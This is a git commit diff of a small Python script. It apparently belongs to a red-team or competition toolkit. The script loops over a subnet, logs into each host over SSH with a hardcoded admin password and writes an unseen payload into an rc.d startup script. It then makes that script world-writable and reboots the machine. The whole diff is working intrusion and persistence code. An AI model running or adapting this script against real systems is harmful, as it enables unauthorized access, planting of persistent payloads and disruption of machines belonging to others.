1d0b83e1152b2e915e29a626d2a6334c61763671
Blake <80996688+BlakeTnr@users.noreply.github.com>
2024-03-02 09:04:53 -0500

    Update paratest.py

--- blakeshit/paratest.py
+++ blakeshit/paratest.py
@@ -16,9 +16,12 @@ host = ""
 username = "admin"
 password = "Change.me123!"
 
-client = paramiko.client.SSHClient()
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-client.connect(host, username=username, password=password)
-client.exec_command(commandforwriting + " > /usr/local/etc/rc.d/ctsh.sh")
-client.exec_command("chmod 777 /usr/local/etc/rc.d/ctsh.sh")
-client.exec_command("reboot")
+for x in range(16):
+    if(x==9):
+        continue
+    client = paramiko.client.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect("172.20.1." + str(x), username=username, password=password)
+    client.exec_command(commandforwriting + " > /usr/local/etc/rc.d/ctsh.sh")
+    client.exec_command("chmod 777 /usr/local/etc/rc.d/ctsh.sh")
+    client.exec_command("reboot")
